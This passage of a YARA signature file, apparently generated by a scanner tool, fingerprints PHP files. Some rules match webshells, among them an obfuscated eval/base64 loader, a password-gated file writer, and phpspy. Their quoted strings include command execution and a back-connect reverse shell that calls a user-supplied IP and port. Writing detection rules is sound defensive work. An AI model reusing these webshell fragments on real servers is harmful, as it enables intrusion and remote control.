      $s11 = "mu5M7xDcuizfs1/mX9QG+vz+6r2HAje29PfZNbyqzY7//5cemfwldHo21OTM0+7MnuEB6e3x7N3hOSM7f191AT+0/ianIauE1rCzIbEy3yHV8nxY98EjaIrcwq8XlZPc" ascii
      $s12 = "RFn9md7tx3Y8MWXjgnIaR6x78ujz/mOzwKj5Z3IRchNxqa8yzw//mOs4aWsecOXPxP7Hom5yI2t2VPiMTDhDpb6xA5gT2MztuBvc6SJC9b4rvPsOw/nhdzaOsVc29E2Z" ascii
      $s13 = "A/4IWKz2Dv7aXI3Z1xDDYf+EnNZR7VOcfbgDF7dg++JW53l+sh9mPLfaNeSr7JHPmftTL1W/lPuMnP2yPkyb4S8rPX7LWuZfSLOG+vz813zYdeXUldTDu+lWkPgkvObn" ascii
      $s14 = "p8jdrKWHltiHxT1grw3elzU6NV/DgbCDpHrxlYxx3Oef6K2DJhimbiGrM+EmejJm2dZD/9/6TthXjq2n17l8ZnXPkP0CdL7J1c5f0Zsp45Gfh/bzFrBpwdvwBOZ85rUj" ascii
      $s15 = "$img = isset($_GET['img']) ? $_GET['img'] : \"\";" fullword ascii
      $s16 = "exDSA7CfqR7NQZLPXlg6uTc5M5vjWmO5AzsFXyXvSVqfNxKLg9cFvPRtz4PcsSSoyMXSP83dXewtLpQ8Rv0YJs/u1XX6PDJR68hsweYeY4uAlxH449P2VMLbw1NbPulE" ascii
      $s17 = "/Ii4KwteGxL7ED9QvsaXHsujfvGeTq/v4N94f3WxDdHfBMxh5gC3xJbtWM7uRvEw8GQ5IVPcBex9Ttrf2tcOvzhUuZeF/zvVPMbf39vW3QkRj/IoSUm0UffYyce/ezEt" ascii
      $s18 = "D2ak54hePBV7mHR54ITya7orE14XsHSYqmz3yH7OO6W3/oeyEnN/WJ/AW0NekXyh1IHM3thRgGudbeduu6ZmHNWeyW8S07AuDeGYN+GnhEcuOvez5b9dXewibO3Ut8Cn" ascii
      $s19 = "LS0L4RjxnOio8v8a/wPdePxLLlTnknuQng5cKnQoYFTRq8yGoxwLNA+cc4oeHqK5878PvXfUb9OLIXmIrlv+VfJiZCXRu9NH7eXc3zp03a2Y74brXh1/c5SI3tPLoGZQ" ascii
      $s20 = "j4tfCD0mpgrqh9+VHOIuIc88+QlOGTUB/JZUktS3xM/wfBqCSfXsBNkPzc9FHWptp4zG29fZV/XHkrqQb0/0oPgZ6ubEKyjj0/OED6SJzibmvBere+QdweX2jo+PQBmN" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule php22_oi
{
   meta:
      description = "php22 - file oi.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "80d3d972291e00b550296e0a418dd4fd85a4cbed6823c159d70a73bad738348b"
   strings:
      $s1 = "eval(\"?>\".gzuncompress(base64_decode(\"eJzsvXtbG0eyOPz/eZ7zHZqJYkuxEALbuYAhwYBjToxhAa83P+BVRpqRNEHSKDMjLsn6u79V1feeHkmQZE/2POv" ascii
      $s2 = "<?php /* shaje3 <<YeMeNi HaCkeR>>  www.shaja.net*/" fullword ascii
      $s3 = "9RlBia4QAq+JvlayjrbTmv5rh3tComN/YWCIjsive+Po2zcZKj+gqOPkkcNVy/UOMS19gQHmY1uJRZkjZ3qfUdA6jH2lkBoJaKAnaZXU6CJlksObZMYtfrm8bgFKCKqd" ascii
      $s4 = "qdaNbyYbPW/6XbwUhReADOh1YcmXJeDYNVwSjC8GsN8rApdNNr3WSyRltC0AzWcvyapFyhBUd0uWCEPbGARNGvzB0VEwyxt4bzDicmdA4jt+PTvN6u2dyXilPTdYJgdd" ascii
      $s5 = "t1v9YPewOita1vFXE+i8l0upuKqr3ub1ZiYdmSqCsq0gIRhUn+FtUt3raEnULbJleqG1dLlshijhm1MdH2t1bLWaoDcs2EW5osVzftVTSjeqo/bvQ1wXa9EY8Xa66oWA" ascii
      $s6 = "K8z5aMurMPIIGfb4dGSKXI5l14nVgetZiMFrznz40vGQNQnn7IlX/6S+mHx9wP3g/Zy8Zgvzw5lvvvHrQMhFwu1OAFRu9y3ymyo6SZZ0yefswp8I41kPGYKxebNTC+lx" ascii
      $s7 = "vyB2hx3iAIZRY6t1tSs9FNJkbnYApGdAwX79HypRlkXWVCUZOdg0JPn4pEIaOv9OO0XxdArKcvVKUWgMYpK0s12dfr32w4xvK1jKYpR4HTeaP59Pap9ZA9dRoOd00F3H" ascii
      $s8 = "9q/fxplzCVHg34DAAF+hFL5bnXs2GJ5wL4uC96MqCMjVyA/g0/2KdZau2fc5ZeyeRkbsHfm2/7aqj5YV9oufYatihbdSrwidfyjCF4mz/QX9cJ40fyqxNJTsADOGQ8wi" ascii
      $s9 = "zYcW0AYFDOwedC7UTPxmDTWHMTX9Rc8yUZC7um86KMHj7xroxmtqjmIDl6hXEBnT8hAyxwjpBoUWElcGeTn1vgH/5ADb1PQ6NUwlE+UuO+UWORVyIeRyv0pJo+pxD4qB" ascii
      $s10 = "2RoPz1wOd2g92e0Iki0Y2EjdnohBw5nPZU0Ct3zQgkULZDgmSpY7zLB3Sqo7yeaBaBMzBcl2ove5rY1Y5TjyUHnlbfngJstBILRW0pYXaxPMM30WqvLGfYiG13106P5I" ascii
      $s11 = "+f2/izXwSr+VNxeFGBA1+0cxs/0bfEposTP/1ynalYefyGG8/hkGLehRorp5Ztlcu64Wy9TZEyVcnBlU/LqIdl3Gc61Xk9ccFQ6JgOrr86Waug5tE46zbxlq2hovnOha" ascii
      $s12 = "2j5fm1rJGgZZGw1LlOj6NrZlVRVfTWCnY5icQtrAWgS16vq2Spt2kRmVnnKFl6N4vZfTpj0Jv4W/YmzSyiNRkNCTNbRDpuli+9tSEjn3OL78V/PDjzUY/zFKl496yCGU" ascii
      $s13 = "Q6GkOLEr2hiCesBSTuX0KBTCRgpzSAMxeL9FHiOns5gw3eFI5GDK93kpuwQDnDIz8BmTbwZKiabH5JQZob9ioX6NnDTA68AX9pKy5KPZF+vk5+mRcuyb0X7ZKPYZalHV" ascii
      $s14 = "T/CJC7UAqasqRKKpfOvQPi67VLopOrTzP3uF7Bh/ttma22zM+7TEd+zm5zJfMG2J+ie9a7HzjRkHOgQTkXaCIwSDU5dx4AdC8pDH0pb3Ku50COdPoO7ojlP+Zh4z/lLn" ascii
      $s15 = "6FUYt3fO5PWKJ974H6fg8vWAhaJ79lxN9XksiLVi/z9XqjaRnkMf+CrFFJdx+8S+X3C7qWHMfQ5U+v0/uLxXEzm1BinAunIh5oAbpoInXyIuYB7nFr77JNP55LxCokM6" ascii
      $s16 = "4k8fTbgP2T4Q/2NGiFUZSP6CF6nglS0lNSljgvDxvQijC/Rt8o2VvHmVKUNAP3ZuSda+2sMTlzxjx8mqhCMdMCjwOeYROoiNUh9wTqqZ2Gc5os8qO4H8K0VWNS5efggD" ascii
      $s17 = "JLFbubJYHAzwqRpaJ042F953SewuKZI6kbhaRMZPRcjkGRJWMlMpkSk45SwOoBA9HeLcMdmm1jGPwjlALB9g7Ped5cl2YPPPvt8UeVueFk7kPd8wOV7WSeHp8YWTLH0m" ascii
      $s18 = "nh5ukcuBINDlT+gRnoeDDuyFOOVZBRAWw623jMgYkA2ZYOiNUA2r8bhwXxZaDxARMAjBHyEIYmMnxD4x8P7f6QJPrC0z0n3ldceKfJBVRwzcQIvUt9xN5nWkTuWijbSr" ascii
      $s19 = "Kz6WZJ5uKHmQk7bCfK0qkqIBPMQiDz5qoAfpiZ6WR0bxWQCWahjMy/tZyiky+COMsshiJzJWPKYu5mUSfq4TDEvWEK5wS0bd5kl5yoSU4bNRwqkojJKsjrP5nwxHKNus" ascii
      $s20 = "15B1+YDX/K0dccMdwVRG+NYDrATrXTVIBvf1KcM6sL2ukWaAubM4UGc53njEA4sGhUz7rpHfp5yhB/RhVcc5eTn7jl40+sSYvRhChvqLUinG6qYW8NhB5cXFT9IvxlzT" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule php22_php2
{
   meta:
      description = "php22 - file php2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2383185ff36ba22a1b4ad26c7a5d9f84fb23d6188c428e1e97f65f7be907de12"
   strings:
      $s1 = "<?=$_SERVER['SERVER_NAME']?>(<?=@gethostbyname($_SERVER['SERVER_NAME'])?>)<br>" fullword ascii
      $s2 = "if ($_GET[pass]==$password){" fullword ascii
      $s3 = ":<input type=\"text\" name=\"lujing\" id=\"lujing\" value='<?php echo $_SERVER[\"SCRIPT_FILENAME\"]?>' />" fullword ascii
      $s4 = ":<input type=\"password\" name=\"pass\" id=\"pass\">" fullword ascii
      $s5 = "$password=\"keio\";/**" fullword ascii
      $s6 = "#shc{font-family:Georgia;background:#fff;width:63px;height:20px;border=#0000 1px solid}" fullword ascii
      $s7 = "if(fwrite($fo,$_POST[\"neirong\"]))" fullword ascii
      $s8 = "<form action=\"\" method=\"GET\">" fullword ascii
      $s9 = "$fo=fopen($_POST[\"lujing\"],\"w\");" fullword ascii
      $s10 = ":<?php echo $_SERVER[\"SCRIPT_FILENAME\"]?>" fullword ascii
      $s11 = "#neirong{width:558px;height:250px;border=#0000 1px solid}" fullword ascii
      $s12 = "#lujing{font-family:Georgia;width:389px;border=#0000 1px solid}" fullword ascii
      $s13 = "if ($_POST)" fullword ascii
      $s14 = "<textarea name=\"neirong\" id=\"neirong\">" fullword ascii
      $s15 = "<input type=\"submit\" id=\"shc\" value=\"" fullword ascii
      $s16 = "<input type=\"submit\" name=\"denglu\" value=\"" fullword ascii
      $s17 = "IP <?=$_SERVER['SERVER_NAME']?></title>" fullword ascii
   condition:
      uint16(0) == 0x683c and filesize < 3KB and
      8 of them
}

rule ReminderServiceProvider
{
   meta:
      description = "php22 - file ReminderServiceProvider.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4623c9db2e7d7e6417bd32461606e730a70323d367d11169e55c32c7aa9db1e5"
   strings:
      $s1 = "* Get the services provided by the provider." fullword ascii
      $s2 = "$this->app->bindShared('auth.password', function ($app)" fullword ascii
      $s3 = "use Shared\\Auth\\Reminders\\PasswordBrokerManager;" fullword ascii
      $s4 = "* Register the service provider." fullword ascii
      $s5 = "return array('auth.password', 'auth.password.broker');" fullword ascii
      $s6 = "$this->app->bind('auth.reminder.broker', function ($app)" fullword ascii
      $s7 = "return $app->make('auth.password')->broker();" fullword ascii
      $s8 = "return new PasswordBrokerManager($app);" fullword ascii
      $s9 = "namespace Shared\\Auth\\Reminders;" fullword ascii
      $s10 = "* Indicates if loading of the provider is deferred." fullword ascii
      $s11 = "use Nova\\Support\\ServiceProvider;" fullword ascii
      $s12 = "class ReminderServiceProvider extends ServiceProvider" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}


rule PagerRendererTest
{
   meta:
      description = "php22 - file PagerRendererTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d4b94be77de331d15f9a9af3cff997db7d07885bf8334c5c0f2efff55314988a"
   strings:
      $s1 = "$this->assertEquals('http://example.com/foo?foo=bar&page=50', $pager->getLast());" fullword ascii
      $s2 = "$this->assertEquals('http://example.com/foo?foo=bar&page=7', $pager->getNext());" fullword ascii
      $s3 = "$this->assertEquals('http://example.com/foo?foo=bar&page=1', $pager->getFirst());" fullword ascii
      $s4 = "$this->assertEquals('http://example.com/foo?foo=bar&page=3', $pager->getPrevious());" fullword ascii
      $s5 = "$this->assertEquals('http://example.com/foo?foo=bar&page=2', $pager->getPrevious());" fullword ascii
      $s6 = "$this->assertEquals('http://example.com/foo?foo=bar&page=5', $pager->getNext());" fullword ascii
      $s7 = "$this->uri = new URI('http://example.com/foo');" fullword ascii
      $s8 = "'uri' => 'http://example.com/foo?page=3'," fullword ascii
      $s9 = "'uri' => 'http://example.com/foo?page=4'," fullword ascii
      $s10 = "'uri' => 'http://example.com/foo?page=5'," fullword ascii
      $s11 = "public function testGetPreviousWhenSurroundCountIsZero()" fullword ascii
      $s12 = "public function testGetNextWhenSurroundCountIsZero()" fullword ascii
      $s13 = "public function testGetFirstAndGetLast()" fullword ascii
      $s14 = "public function testHasPreviousReturnsTrueWhenFirstIsMoreThanOne()" fullword ascii
      $s15 = "public function testHasNextReturnsTrueWhenLastIsSmallerThanTotal()" fullword ascii
      $s16 = "use CodeIgniter\\HTTP\\URI;" fullword ascii
      $s17 = "public function testHasPreviousReturnsFalseWhenFirstIsOne()" fullword ascii
      $s18 = "public function testHasNextReturnsFalseWhenLastIsTotal()" fullword ascii
      $s19 = "<?php namespace CodeIgniter\\Pager;" fullword ascii
      $s20 = "$this->assertEquals($expected, $pager->links());" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule publish_class
{
   meta:
      description = "php22 - file publish.class.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2d7ca1d554b9927311cf5209de0ddb687991b48ea72b6282bd6969d1ece340cf"
   strings:
      $s1 = "* @subpackage processors.resource" fullword ascii
      $s2 = "$this->modx->logManagerAction('publish_resource',$this->resource->get('class_key'),$this->resource->get('id'));" fullword ascii
      $s3 = "return $this->success('',$this->resource->get(array('id', 'pub_date', 'unpub_date', 'editedby', 'editedon', 'publishedby" fullword ascii
      $s4 = "$duplicateContext = $workingContext->getOption('global_duplicate_uri_check', false) ? '' : $this->resource->get('context_key');" fullword ascii
      $s5 = "/* get the targeted working context */" fullword ascii
      $s6 = "'context_settings' => array('contexts' => array($this->resource->get('context_key')))," fullword ascii
      $s7 = "'auto_publish' => array('contexts' => array($this->resource->get('context_key')))," fullword ascii
      $s8 = "* Attempt to lock the Resource" fullword ascii
      $s9 = "$workingContext = $this->modx->getContext($this->resource->get('context_key'));" fullword ascii
      $s10 = "'resource' => array('contexts' => array($this->resource->get('context_key')))," fullword ascii
      $s11 = "$this->resource->set('publishedby',$this->modx->user->get('id'));" fullword ascii
      $s12 = "return 'modResourcePublishProcessor';" fullword ascii
      $s13 = "$this->lockedUser = $this->modx->getObject('modUser', $locked);" fullword ascii
      $s14 = "* Log a manager action" fullword ascii
      $s15 = "$duplicateContext = $workingContext->getOption('global_duplicate_uri_check', false) ? '' : $this->resource->get('con" fullword ascii
      $s16 = "$this->resource->set('editedby',$this->modx->user->get('id'));" fullword ascii
      $s17 = "class modResourcePublishProcessor extends modProcessor {" fullword ascii
      $s18 = "$aliasPath = $this->resource->getAliasPath($this->resource->get('alias'));" fullword ascii
      $s19 = "if (!$saved) return $this->failure($this->modx->lexicon('resource_err_publish'));" fullword ascii
      $s20 = "'user' => $this->lockedUser->get('username')," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule PhpBBInstaller
{
   meta:
      description = "php22 - file PhpBBInstaller.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "20b1ed635e4310daf353f416c86965a1f132b46b6e59b4836df6c9756d536cf6"
   strings:
      $s1 = "namespace Composer\\Installers;" fullword ascii
      $s2 = "'extension' => 'ext/{$vendor}/{$name}/'," fullword ascii
      $s3 = "'language'  => 'language/{$name}/'," fullword ascii
      $s4 = "class PhpBBInstaller extends BaseInstaller" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php22_p28n
{
   meta:
      description = "php22 - file p28n.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "679a997d4a24d4153995813e5385ed22946194047d261cc9a3146eb1bd793f6f"
   strings:
      $s1 = "$this->change(($this->Cookie->read('lang') ? $this->Cookie->read('lang') : DEFAULT_LANGUAGE));" fullword ascii
      $s2 = "if (!$this->Session->check('Config.language')) {" fullword ascii
      $s3 = "$this->Session->write('Config.language', $lang);" fullword ascii
      $s4 = "var $components = array('Session', 'Cookie');" fullword ascii
      $s5 = "$this->Cookie->write('lang', $lang, null, '+350 day'); " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule Products
{
   meta:
      description = "php22 - file Products.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5a23a60996ccf8bfaf38a7d609d77e4f2c80bfd44fc1f91ef1613dfd6273ba34"
   strings:
      $s1 = "* Returns a human representation of 'active'" fullword ascii
      $s2 = "* Products initializer" fullword ascii
      $s3 = "public function getActiveDetail()" fullword ascii
      $s4 = "* Products" fullword ascii
      $s5 = "$this->belongsTo('product_types_id', 'ProductTypes', 'id', [" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule PublicationForm
{
   meta:
      description = "php22 - file PublicationForm.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ec8359d9e0ed1ace0956fd958e0dafe169271b550070c2e9de3ae597bafb966c"
   strings:
      $s1 = "$meta_description = new TextArea('meta_description', ['style' => 'height:4em; min-height: inherit']);" fullword ascii
      $s2 = "$meta_keywords = new TextArea('meta_keywords', ['style' => 'height:4em; min-height: inherit']);" fullword ascii
      $s3 = "* User: office-pb1" fullword ascii
      $s4 = "* Date: 07.07.14" fullword ascii
      $s5 = "* Created by PhpStorm." fullword ascii
      $s6 = "$meta_description->setLabel('meta-description');" fullword ascii
      $s7 = "* Time: 22:48" fullword ascii
      $s8 = "$meta_keywords->setLabel('meta-keywords');" fullword ascii
      $s9 = "$meta_title = new Text('meta_title', ['required' => true]);" fullword ascii
      $s10 = "$type = new Select('type_id', Type::cachedListArray(['key' => 'id']));" fullword ascii
      $s11 = "$this->add($meta_keywords);" fullword ascii
      $s12 = "$this->add($meta_description);" fullword ascii
      $s13 = "$title = new Text('title', ['required' => true]);" fullword ascii
      $s14 = "use Phalcon\\Validation\\Validator\\PresenceOf;" fullword ascii
      $s15 = "$preview_inner = new Check('preview_inner');" fullword ascii
      $s16 = "$image->setLabel('Thumbnail Image');" fullword ascii
      $s17 = "$title->addValidator(new PresenceOf([" fullword ascii
      $s18 = "$preview_inner->setLabel('Show preview image inside publication');" fullword ascii
      $s19 = "use Phalcon\\Forms\\Element\\Select;" fullword ascii
      $s20 = "use Phalcon\\Forms\\Element\\TextArea;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule Patchers_spec
{
   meta:
      description = "php22 - file Patchers.spec.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7c29d38baed7e5657e7ca198f1caefc84e63ab7d6b9eb86be0f0840497e8cf0f"
   strings:
      $s1 = "expect($stub2)->toReceive('process')->with(Arg::toMatch($matcher), $path);" fullword ascii
      $s2 = "expect($stub1)->toReceive('process')->with(Arg::toMatch($matcher), $path);" fullword ascii
      $s3 = "it(\"bails out if code to process is an empty string\", function () {" fullword ascii
      $s4 = "expect($this->patchers->process(''))->toBe('');" fullword ascii
      $s5 = "expect($this->stub2)->toReceive('findFile')->with($this->loader, $this->class, $this->file);" fullword ascii
      $s6 = "expect($this->stub1)->toReceive('findFile')->with($this->loader, $this->class, $this->file);" fullword ascii
      $s7 = "$this->patchers->process($code, $path);" fullword ascii
      $s8 = "describe(\"->process()\", function () {" fullword ascii
      $s9 = "$path = 'tmp/hello_world.php';" fullword ascii
      $s10 = "$actual = $this->patchers->findFile($this->loader, $this->class, $this->file);" fullword ascii
      $s11 = "$this->loader = Double::instance();" fullword ascii
      $s12 = "allow($this->stub2)->toReceive('findFile')->andRun(function () use ($file) {" fullword ascii
      $s13 = "allow($this->stub2)->toReceive('findFile')->andRun(function () use ($path) {" fullword ascii
      $s14 = "allow($this->stub1)->toReceive('findFile')->andRun(function () use ($file) {" fullword ascii
      $s15 = "$actual = $this->patchers->get('my_patcher');" fullword ascii
      $s16 = "$code = \"<?php\\necho 'Hello World!';\\n\";" fullword ascii
      $s17 = "it(\"runs `true` when at least one patcher consider a class as patchable\", function () {" fullword ascii
      $s18 = "expect($this->patchers->add('my_patcher', \"not an object\"))->toBe(false);" fullword ascii
      $s19 = "describe(\"->get()\", function () {" fullword ascii
      $s20 = "describe(\"->add/get()\", function () {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}


rule ResolvedFormTypeTest
{
   meta:
      description = "php22 - file ResolvedFormTypeTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f599039662803366f1e247731d8a1a05fa1e36c3da09e4b3528839b92f94cb62"
   strings:
      $s1 = "* @author Bernhard Schussek <bschussek@gmail.com>" fullword ascii
      $s2 = "return $this->getMockBuilder('Symfony\\Component\\Form\\AbstractTypeExtension')->setMethods(array('getExtendedType', 'confi" fullword ascii
      $s3 = "$this->dispatcher = $this->getMockBuilder('Symfony\\Component\\EventDispatcher\\EventDispatcherInterface')->getMock();" fullword ascii
      $s4 = "$optionsResolver = $this->getMockBuilder('Symfony\\Component\\OptionsResolver\\OptionsResolver')->getMock();" fullword ascii
      $s5 = "$this->assertEquals($index, $i, 'Executed at index '.$index);" fullword ascii
      $s6 = "* @var \\PHPUnit_Framework_MockObject_MockObject|FormTypeExtensionInterface" fullword ascii
      $s7 = "$builder = $this->getMockBuilder('Symfony\\Component\\Form\\Test\\FormBuilderInterface')->getMock();" fullword ascii
      $s8 = "$this->dataMapper = $this->getMockBuilder('Symfony\\Component\\Form\\DataMapperInterface')->getMock();" fullword ascii
      $s9 = "$this->factory = $this->getMockBuilder('Symfony\\Component\\Form\\FormFactoryInterface')->getMock();" fullword ascii
      $s10 = "* @var \\PHPUnit_Framework_MockObject_MockObject|FormTypeInterface" fullword ascii
      $s11 = "return $this->getMockBuilder('Symfony\\Component\\Form\\FormFactoryInterface')->getMock();" fullword ascii
      $s12 = "return $this->getMockBuilder($typeClass)->setMethods(array('getBlockPrefix', 'configureOptions', 'finishView', 'buildVie" fullword ascii
      $s13 = "$this->resolvedType = $this->getMockBuilder('Symfony\\Component\\Form\\ResolvedFormType')" fullword ascii
      $s14 = "$form = $this->getMockBuilder('Symfony\\Component\\Form\\Test\\FormInterface')->getMock();" fullword ascii
      $s15 = "$parentView = $this->getMockBuilder('Symfony\\Component\\Form\\FormView')->getMock();" fullword ascii
      $s16 = "* @var \\PHPUnit_Framework_MockObject_MockObject" fullword ascii
      $s17 = "$view = $this->getMockBuilder('Symfony\\Component\\Form\\FormView')->getMock();" fullword ascii
      $s18 = "$this->resolvedType = new ResolvedFormType($this->type, array($this->extension1, $this->extension2), $this->parentResolv" fullword ascii
      $s19 = "->setConstructorArgs(array($this->type, array($this->extension1, $this->extension2), $this->parentResolvedType))" fullword ascii
      $s20 = "private function getMockFormType($typeClass = 'Symfony\\Component\\Form\\AbstractType')" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 40KB and
      8 of them
}

rule phpspy_2009MSSQL
{
   meta:
      description = "php22 - file phpspy-2009MSSQL.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5cfb62e3f564c3ddbfc77d978ae422d455a1862683e72754492683ad4e1c0ee2"
   strings:
      $x1 = "$exec = $wsh->exec('cmd.exe /c '.$command);" fullword ascii
      $x2 = "!$program && $program = 'c:\\windows\\system32\\cmd.exe';" fullword ascii
      $x3 = "p('<p><a href=\"http://w'.'ww.4ng'.'el.net/php'.'spy/pl'.'ugin/\" target=\"_blank\">Get plugins</a></p>');" fullword ascii
      $x4 = "<a href=\"javascript:goaction('shell');\">Execute Command</a> | " fullword ascii
      $x5 = "$res = execute(which('perl').\" /tmp/angel_bc $yourip $yourport &\");" fullword ascii
      $x6 = "$res = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c');" fullword ascii
      $x7 = "Copyright (C) 2004-2009 <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel Team [S4T]</a> All Rights Reserved." fullword ascii
      $x8 = "formhead(array('title'=>'Execute Command'));" fullword ascii
      $s9 = "!$parameter && $parameter = '/c net start > '.SA_ROOT.'log.txt';" fullword ascii
      $s10 = "header('Content-Disposition: attachment;filename='.$_SERVER['HTTP_HOST'].'_Files.tar.gz');" fullword ascii
      $s11 = "$res = execute(\"/tmp/angel_bc $yourip $yourport &\");" fullword ascii
      $s12 = "' : '').($curpage > 1 ? '<a href=\"javascript:settable(\\''.$tablename.'\\', \\'\\', '.($curpage - 1).');\">Prev</a> ' : '');" fullword ascii
      $s13 = "echo(execute($command));" fullword ascii
      $s14 = "<span style=\"font:11px Verdana;\">Password: </span><input name=\"password\" type=\"password\" size=\"20\">" fullword ascii
      $s15 = "formhead(array('title'=>'Execute Program'));" fullword ascii
      $s16 = "join sysusers on sysobjects.uid = sysusers.uid where sysobjects.xtype = 'U' order by sysobjects.name asc\");" fullword ascii
      $s17 = "scookie('loginpass', '', -86400 * 365);" fullword ascii
      $s18 = "$a = $shell->ShellExecute($program,$parameter);" fullword ascii
      $s19 = "$result = q(\"SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE '$savepath';\");" fullword ascii
      $s20 = "$process = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule post_process
{
   meta:
      description = "php22 - file post-process.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "fbd91ae5b437550297567d4b54fde83cc4f3929046251fae118f82b1b8ee1b1e"
   strings:
      $s1 = "$url = str_replace( '&amp;', '&', $ninja_forms_processing->get_form_setting( 'landing_page' ) );" fullword ascii
      $s2 = "if( $ninja_forms_processing->get_form_setting( 'landing_page' ) != '' ){" fullword ascii
      $s3 = "if( !$ninja_forms_processing->get_all_errors() ){" fullword ascii
      $s4 = "//print_r($ninja_forms_processing->get_all_errors());" fullword ascii
      $s5 = "if(!$ninja_forms_processing->get_all_errors()){" fullword ascii
      $s6 = "$ninja_forms_processing->update_form_setting( 'processing_complete', 1 );" fullword ascii
      $s7 = "$ajax = $ninja_forms_processing->get_form_setting('ajax');" fullword ascii
      $s8 = "$form_id = $ninja_forms_processing->get_form_ID();" fullword ascii
      $s9 = "function ninja_forms_post_process(){" fullword ascii
      $s10 = "do_action('ninja_forms_post_process');" fullword ascii
      $s11 = "//echo 'post-processing';" fullword ascii
      $s12 = "global $wpdb, $ninja_forms_processing;" fullword ascii
      $s13 = "//header('Content-Type', 'application/json');" fullword ascii
      $s14 = "<?php if ( ! defined( 'ABSPATH' ) ) exit;" fullword ascii
      $s15 = "$json = ninja_forms_json_response();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule phpmailer_lang_he
{
   meta:
      description = "php22 - file phpmailer.lang-he.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "bb922f53509bae7d077197866b3540776b4b7845c438585348d3c9516c9d538d"
   strings:
      $s1 = "* @author Ronny Sherer <ronny@hoojima.com>" fullword ascii
      $s2 = "$PHPMAILER_LANG['smtp_connect_failed']  = 'SMTP Connect() failed.';" fullword ascii
      $s3 = "* Hebrew PHPMailer language file: refer to English translation for definitive list" fullword ascii
      $s4 = "$PHPMAILER_LANG['execute']              = '" fullword ascii
      $s5 = "$PHPMAILER_LANG['mailer_not_supported'] = ' " fullword ascii
      $s6 = "$PHPMAILER_LANG['smtp_error']           = '" fullword ascii
      $s7 = "SMTP: " fullword ascii
      $s8 = "$PHPMAILER_LANG['connect_host']         = '" fullword ascii
      $s9 = "SMTP.';" fullword ascii
      $s10 = "SMTP: ';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      all of them
}

rule profile_blade
{
   meta:
      description = "php22 - file profile.blade.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "efa4fcb782c71eb49ea0e389a9883ec30a94f833024a8da1c0255a6b8606e058"
   strings:
      $s1 = "{{--<a href=\"{{url('user/'.auth_user()->user_id)}}\">--}}" fullword ascii
      $s2 = "{{--<span class=\"badge badge-sm up bg-danger pull-right-xs\">2</span>--}}" fullword ascii
   condition:
      uint16(0) == 0x6c3c and filesize < 1KB and
      all of them
}

rule php22_prepare
{
   meta:
      description = "php22 - file prepare.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3ed441b3d4be657f72db9f711836bc15043b7daadc51fbee676df6dc8c08a3d5"
   strings:
      $s1 = "throw new \\RuntimeException('There already is a directory (not symlink) named \"current\" in ' . get('deploy_path') . '. R" fullword ascii
      $s2 = "run(\"cd {{deploy_path}} && if [ ! -d .dep ]; then mkdir .dep; fi\");" fullword ascii
      $s3 = "run(\"cd {{deploy_path}} && if [ ! -d shared ]; then mkdir shared; fi\");" fullword ascii
      $s4 = "run(\"cd {{deploy_path}} && if [ ! -d releases ]; then mkdir releases; fi\");" fullword ascii
      $s5 = "run('if [ ! -d {{deploy_path}} ]; then mkdir -p {{deploy_path}}; fi');" fullword ascii
      $s6 = "$result = test('[ ! -L {{deploy_path}}/current ] && [ -d {{deploy_path}}/current ]');" fullword ascii
      $s7 = "'Shell on your server is not POSIX-compliant. Please change to sh, bash or similar.'" fullword ascii
      $s8 = "// Check if shell is POSIX-compliant" fullword ascii
      $s9 = "// Check for existing /current directory (not symlink)" fullword ascii
      $s10 = "desc('Preparing host for deploy');" fullword ascii
      $s11 = "/* (c) Anton Medvedev <anton@medv.io>" fullword ascii
      $s12 = "if (!str_contains($result, 'bash') && !str_contains($result, 'sh')) {" fullword ascii
      $s13 = "use function Deployer\\Support\\str_contains;" fullword ascii
      $s14 = "$result = run('echo $0');" fullword ascii
      $s15 = "// Create metadata .dep dir." fullword ascii
      $s16 = "emove this directory so it can be replaced with a symlink for atomic deployments.');" fullword ascii
      $s17 = "// Create shared dir." fullword ascii
      $s18 = "task('deploy:prepare', function () {" fullword ascii
      $s19 = "throw new \\RuntimeException('There already is a directory (not symlink) named \"current\" in ' . get('deploy_path') . '. Remove" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
